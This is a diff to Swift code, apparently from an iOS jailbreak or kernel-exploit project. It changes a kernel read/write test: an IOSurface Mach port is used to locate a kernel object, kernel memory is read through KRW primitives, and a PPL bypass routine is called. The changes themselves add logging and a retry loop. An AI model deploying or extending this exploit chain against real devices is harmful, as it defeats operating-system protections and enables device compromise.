@@ -22,8 +22,8 @@ func getSurfacePort(magic: UInt64 = 1337) throws -> mach_port_t {
     
     let port = IOSurfaceCreateMachPort(surf!)
     
-    print("Base: \(IOSurfaceGetBaseAddress(surf!))")
-    print("Size: \(IOSurfaceGetAllocSize(surf!))")
+    KRW.logger("Base: \(IOSurfaceGetBaseAddress(surf!))")
+    KRW.logger("Size: \(IOSurfaceGetAllocSize(surf!))")
     
     IOSurfaceGetBaseAddress(surf!).assumingMemoryBound(to: UInt64.self).pointee = magic
     
@@ -38,7 +38,20 @@ var realUcred: UInt64?
 
 func testkrwstuff() throws {
     let port = try getSurfacePort()
-    let surface = try KRW.rPtr(virt: try KRW.ourProc!.task!.getKObject(ofPort: port) + 0x18 /* IOSurfaceSendRight -> IOSurface */)
+    
+    KRW.logger("[+] Port: \(port)")
+    var kobject = UInt64(0)
+    //my wierd attemt to fix app crashes
+    for _ in 0..<20{
+        guard let virt = try? KRW.ourProc?.task!.getKObject(ofPort: port) else {
+            KRW.logger("[-] OurProc is nil -> continue run")
+            continue
+        }
+        kobject = virt
+        KRW.logger("[+] Got ourProc of port \(kobject)")
+        break
+    }
+    let surface = try KRW.rPtr(virt: kobject + 0x18/* IOSurfaceSendRight -> IOSurface */)
     
     let surfaceBase = surface & ~0x3FFF
     let surfaceOff  = surface & 0x3FFF
@@ -48,6 +61,10 @@ func testkrwstuff() throws {
     try print("krw r64: \(KRW.r64(virt: surface))")
     print("mapped: \(mapped!.advanced(by: Int(surfaceOff)).assumingMemoryBound(to: UInt64.self).pointee)")
     print("Hilo!")
+    
+    
+    try KRW.logger("krw r64: \(KRW.r64(virt: surface))")
+    KRW.logger("mapped: \(mapped!.advanced(by: Int(surfaceOff)).assumingMemoryBound(to: UInt64.self).pointee)")
     
     try KRW.doPPLBypass()
     
